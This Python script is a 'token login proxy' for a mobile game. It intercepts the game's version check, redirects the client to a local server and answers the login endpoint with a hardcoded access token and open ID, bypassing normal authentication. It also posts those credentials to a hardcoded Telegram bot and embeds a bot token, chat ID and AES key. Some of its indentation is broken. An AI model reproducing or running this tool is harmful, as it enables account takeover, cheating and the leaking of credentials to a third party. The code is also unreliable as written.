import json
import requests
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import httpx
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from x7m import *

# ANSI Colors for Terminal Styling
G = "\033[92m"  # Green
Y = "\033[93m"  # Yellow
R = "\033[91m"  # Red
B = "\033[94m"  # Blue
W = "\033[0m"   # Reset

# Get local IP address automatically for network proxy link
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

LOCAL_IP = get_local_ip()
PORT = 6543

print(f"{G}╔══════════════════════════════════════════╗")
print(f"║       NIROB BBZ - TOKEN LOGIN PROXY      ║")
print(f"║          SECURE SERVER v3.0              ║")
print(f"╚══════════════════════════════════════════╝{W}\n")

# ================= CONFIGURATION & TARGET TOKENS =================
TOKEN = "8657325145:AAFFcum6toNn8F0uYhg9M6Xw2JmeLnScW9s"
ID = "7224513731"

# এখানে তোমার কাঙ্ক্ষিত ফিক্সড এক্সেস টোকেন এবং ওপেন আইডি বসিয়ে দাও
# গেম এই টোকেন দিয়েই অটো লগইন করবে লোকাল কনফিগের প্রক্সি লিংকের মাধ্যমে!
FIXED_ACCESS_TOKEN = "a80190ab087dc622758faa6a2a7a8b12961733d306fdc5a927596f6ca208c2c"
FIXED_OPEN_ID = "3cdcaa59c8bddd12bf4343600f09c08a"
# =================================================================

Key, Iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'

def EnC_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return cipher.encrypt(pad(HeX, AES.block_size)).hex()
    
def DEc_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return unpad(cipher.decrypt(HeX), AES.block_size).hex()

class ProxyHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        self.handle_request_method()

    def do_POST(self):
        self.handle_request_method()

    def handle_request_method(self):
        parsed_path = urlparse(self.path)
        path = parsed_path.path

        # Handle /ver.php route
        if path == "/ver.php":
            target = "https://version.ggwhitehawk.com/live/ver.php"
            print(f"{B}[INFO] Forwarding /ver.php request...{W}")
            
            headers = {
                k: v for k, v in self.headers.items()
                if k.lower() not in ("host", "content-length", "connection")
            }
            
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length) if content_length > 0 else b""

            try:
                with httpx.Client(follow_redirects=True) as client:
                    r = client.request(self.command, target, params=parse_qs(parsed_path.query), headers=headers, content=body)

                try:
                    data = r.json()
                except json.JSONDecodeError:
                    data = {"raw": r.text}
                    
                data["server_url"] = f"http://{LOCAL_IP}:{PORT}/"

                self.send_response(r.status_code)
                HOP_BY_HOP = {'transfer-encoding', 'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization', 'te', 'trailers', 'upgrade', 'proxy-connection'}
                for k, v in r.headers.items():
                    if k.lower() not in HOP_BY_HOP and k.lower() not in ("content-length", "content-encoding"):
                        self.send_header(k, v)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(data).encode('utf-8'))
            except Exception as e:
                print(f"{R}[!] /ver.php Error: {e}{W}")
                self.send_response(500)
                self.end_headers()

        # Handle /MajorLogin route (Forcing Fixed Token Login)
        elif path == "/MajorLogin":
            print(f"\n{G}[+] GAME HIT! Injecting Fixed Access Token & Open ID...{W}")
            
            # আমরা সরাসরি ফিক্সড টোকেন এবং ওপেন আইডি ব্যবহার করছি যাতে গেমে ঢুকলেই এই অ্যাকাউন্ট লগইন হয়
                access_token = "a80190ab087dc622758faa6a2a7a8b12961733d306fdc5a927596f6ca208c2c"
    open_id = "3cdcaa59c8bddd12bf4343600f09c08a"

            print(f"{Y}[*] Active Account -> Token: {access_token[:15]}...{W}")
            
            message = f"""🔥 **TOKEN LOGIN BYPASS TRIGGERED** 🔥
──────────────────
🔑 **Injected Access Token:** `{access_token}`
🆔 **Injected Open ID:** `{open_id}`
──────────────────
👑 **Powered by:** NIROB BBZ
⚡ **Status:** Direct Token Injection Active
"""
            print(f"{G}{message}{W}")
            
            # Send notification to Telegram
            try:
                telegram_url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
                requests.post(telegram_url, data={'chat_id': ID, 'text': message, 'parse_mode': 'Markdown'})
            except Exception:
                pass
                
            # VIP Game Screen Response Payload with Injected Credentials
            response_payload = f"""[b][c][00FFCC]













███╗   ██╗██╗██████0╗  ██████╗ ██████╗ 
████╗  ██║██║██╔══██╗██╔═══██╗██╔══██╗
██╔██╗ ██║██║██████╔╝██║   ██║██████╔╝
██║╚██╗██║██║██╔══██╗██║   ██║██╔══██╗
██║ ╚████║██║██║  ██║╚██████╔╝██████╔╝
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝



─────────────────────────────────────

[cccccc]Access Token => [FF0000]{access_token} [cccccc]| Open ID => [00FF00]{open_id}

[FFFF00]System Owner: NIROB BBZ | Token Login Proxy Active
"""

            self.send_response(500)
            self.send_header("Content-Type", "application/octet-stream")
            self.end_headers()
            self.wfile.write(response_payload.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

def run(server_class=HTTPServer, handler_class=ProxyHandler, port=PORT):
    server_address = ('0.0.0.0', port)
    httpd = server_class(server_address, handler_class)
    
    print(f"{G}[✔] Status      : {W}{Y}Running Successfully{W}")
    print(f"{G}[✔] Port        : {W}{Y}{port}{W}")
    print(f"{G}[✔] Local Proxy : {W}{B}http://127.0.0.1:{port}/{W}")
    print(f"{G}[✔] Network IP  : {W}{B}http://{LOCAL_IP}:{port}/{W}")
    print(f"{G}──────────────────────────────────────────{W}")
    print(f"{Y}[*] Waiting for game to hit proxy...{W}\n")
    
    httpd.serve_forever()

if __name__ == '__main__':
    run()
